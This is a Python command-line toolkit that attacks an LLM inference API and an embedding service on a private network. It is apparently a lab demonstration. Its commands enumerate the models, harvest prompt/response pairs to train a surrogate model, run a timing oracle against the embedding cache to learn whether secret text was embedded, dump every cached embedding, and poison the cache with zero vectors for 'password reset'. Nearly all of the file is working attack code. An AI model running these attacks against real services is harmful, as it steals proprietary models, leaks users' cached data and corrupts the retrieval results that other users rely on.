#!/usr/bin/env python3
"""
Model Extraction & Adversarial Input Toolkit
Demonstrates model stealing via repeated queries, timing attacks on
the embedding service, and cache poisoning.
"""

import httpx
import click
from rich import print
import json
import time

MODEL_API_URL = "http://192.168.19.1:8009"
EMBEDDING_URL = "http://192.168.19.1:8010"


@click.group()
def cli():
    """Model Extraction Toolkit"""
    pass


@cli.command()
@click.option("--target", default=MODEL_API_URL)
def recon(target):
    """Enumerate available models and architecture info"""
    print(f"[bold red][*] Model API Recon[/bold red]")

    with httpx.Client(timeout=30.0) as client:
        models = client.get(f"{target}/models").json()
        print(f"\n[green][+] Available Models:[/green]")
        for model in models.get("models", []):
            print(f"  - {model.get('name', 'unknown')}")
            info = client.get(f"{target}/model/{model['name']}/info").json()
            print(f"    Parameters: {info.get('details', {}).get('parameter_size', 'N/A')}")
            print(f"    Family: {info.get('details', {}).get('family', 'N/A')}")

        stats = client.get(f"{target}/stats").json()
        print(f"\n[yellow][*] Query stats: {stats.get('total_queries', 0)} total queries[/yellow]")


@cli.command()
@click.option("--target", default=MODEL_API_URL)
@click.option("--num-queries", default=10, help="Number of extraction queries")
@click.option("--model", default="llama3")
def extract(target, num_queries, model):
    """Model extraction via systematic querying"""
    print(f"[bold red][*] Model Extraction Attack[/bold red]")
    print(f"[*] Sending {num_queries} queries to extract model behavior")

    extraction_prompts = [
        "What is 2+2?",
        "Translate 'hello' to French",
        "Is the Earth flat?",
        "What color is the sky?",
        "Complete: The quick brown fox",
        "What is the capital of France?",
        "Summarize: AI is transforming technology",
        "What is Python?",
        "Write a haiku about rain",
        "What is 10 * 15?",
    ]

    results = []
    with httpx.Client(timeout=120.0) as client:
        for i, prompt in enumerate(extraction_prompts[:num_queries]):
            resp = client.post(
                f"{target}/inference",
                json={"prompt": prompt, "model": model},
            )
            result = resp.json()
            results.append({
                "prompt": prompt,
                "response": result.get("response", "")[:200],
                "tokens": result.get("tokens", 0),
                "elapsed_ms": result.get("elapsed_ms", 0),
            })
            print(f"  [{i + 1}/{num_queries}] {prompt[:40]}... -> {result.get('tokens', 0)} tokens")

    print(f"\n[green][+] Extracted {len(results)} input/output pairs[/green]")
    print(f"[*] These pairs can be used to train a surrogate model")


@cli.command()
@click.option("--target", default=EMBEDDING_URL)
@click.option("--text", default="secret password")
def timing_attack(target, text):
    """Timing oracle attack on embedding cache"""
    print(f"[bold red][*] Timing Oracle Attack[/bold red]")
    print(f"[*] Testing if '{text}' was previously embedded (cache hit = faster)")

    times = []
    with httpx.Client(timeout=30.0) as client:
        for i in range(5):
            start = time.time()
            resp = client.post(f"{target}/embed", json={"text": text})
            elapsed = (time.time() - start) * 1000
            result = resp.json()
            cached = result.get("cached", False)
            times.append(elapsed)
            print(f"  Request {i + 1}: {elapsed:.1f}ms (cached={cached})")

    avg = sum(times) / len(times)
    print(f"\n[yellow][*] Average response time: {avg:.1f}ms[/yellow]")
    print(f"[*] Cache hit indicated by significantly faster responses (<5ms vs >50ms)")


@cli.command()
@click.option("--target", default=EMBEDDING_URL)
def dump_cache(target):
    """Dump all cached embeddings"""
    print(f"[bold red][*] Cache Dump Attack[/bold red]")

    with httpx.Client(timeout=30.0) as client:
        resp = client.get(f"{target}/cache/dump")
    result = resp.json()
    print(f"\n[green][+] Cached embeddings: {result.get('cached_embeddings', 0)}[/green]")
    for key in list(result.get("entries", {}).keys())[:10]:
        emb = result["entries"][key]
        print(f"  {key}: [{emb[0]:.4f}, {emb[1]:.4f}, ...] ({len(emb)} dims)")


@cli.command()
@click.option("--target", default=EMBEDDING_URL)
@click.option("--text", default="password reset")
def cache_poison(target, text):
    """Poison the embedding cache with adversarial embeddings"""
    print(f"[bold red][*] Cache Poisoning Attack[/bold red]")
    print(f"[*] Poisoning embedding for: '{text}'")

    # Create a fake embedding (all zeros - will break similarity searches)
    fake_embedding = [0.0] * 4096

    with httpx.Client(timeout=30.0) as client:
        resp = client.post(
            f"{target}/cache/set",
            json={"text": text, "embedding": fake_embedding},
        )
    print(f"\n[green][+] Cache poisoned: {resp.json()}[/green]")
    print(f"[*] Future requests for '{text}' will return the poisoned embedding")


if __name__ == "__main__":
    cli()
